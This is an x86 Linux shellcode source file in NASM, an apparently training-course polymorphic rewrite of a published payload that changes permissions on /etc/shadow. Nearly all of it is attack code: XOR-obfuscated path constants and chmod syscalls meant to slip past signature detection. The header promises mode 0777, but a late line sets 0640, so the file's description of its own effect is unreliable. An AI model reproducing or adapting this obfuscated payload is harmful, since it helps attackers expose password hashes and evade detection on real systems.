
; Title:    chmod 0777 /etc/shadow (a bit obfuscated) Shellcode - 51 Bytes
; Platform: linux/x86
; Date:     2014-06-22
; Author:   Osanda Malith Jayathissa (@OsandaMalith)
; link:     http://shell-storm.org/shellcode/files/shellcode-875.php
; 46 byte after poly

; Updated
; File shellcode02.nasm
; Author: Saleh Bin Muhaysin
; SLEA: SLAE-1101
; Date: 25/12/2017

section .text
global _start

_start: 
	;mov ebx, eax
	;xor eax, ebx
	xor eax, eax
	
	;push dword eax
	push eax
	
	;mov esi, 0x563a1f3e
	;add esi, 0x21354523	; esi = woda 0x776F6461
	;mov dword [esp-4], esi		
	;mov dword [esp-8], 0x68732f2f	; hs//
	;mov dword [esp-12], 0x6374652f	; cte/
	
	;-mov edx, 0x776F6461
	;-mov word [esp-2], dx
	;-shr edx, 16
	;-mov word [esp-4], dx
	;-mov dword [esp-8], 0x68732f2f	; hs//
	;-mov dword [esp-12], 0x6374652f	; cte/
	
	; changed file path from /etc//shadow -> \x00/etc/shadow
	; thte last \x01 indecator of end the loop
	
	mov ecx, 0x01010101
	mov ebx, 0x766e6560
	xor ebx, ecx
	push dword ebx
	mov ebx, 0x69722e62
	xor ebx, ecx
	push dword ebx
	mov ebx, 0x75642e2e
	xor ebx, ecx
	push dword ebx
	
;	push dword 0x766e6560 ; 0x776f6461 xor 0x01010101
;	push dword 0x69722e62 ; 0x68732f63 xor 0x01010101
;	push dword 0x75642e01 ; 0x74652f00 xor 0x01010101
	
;	lea ecx, [esp+12]
;decode:
;	dec cl			; since length 12 will not need cx
;	xor byte [ecx], 0x01
;	jnz decode 		; while not 01 xor 01 then loop 
;	mov byte [ecx], 0x2f	; make the last char / instead of \x00
	
	
	;sub esp, 12	; esp => /etc//shadow
	mov ebx,esp	
	;push word 0x1ff
	;pop cx
	mov al, 0xf	; __NR_chmod
	mov ecx, eax
	inc ch
	or cl, 0xf0	; ecx = 0777 
	
	mov ecx, 0x1A0	; return to normal 640 permission
	
	;mov al,0xf	; __NR_chmod
	int 0x80
	
	; add to exit normally
	xor eax,eax
	mov al,1
	int 0x80

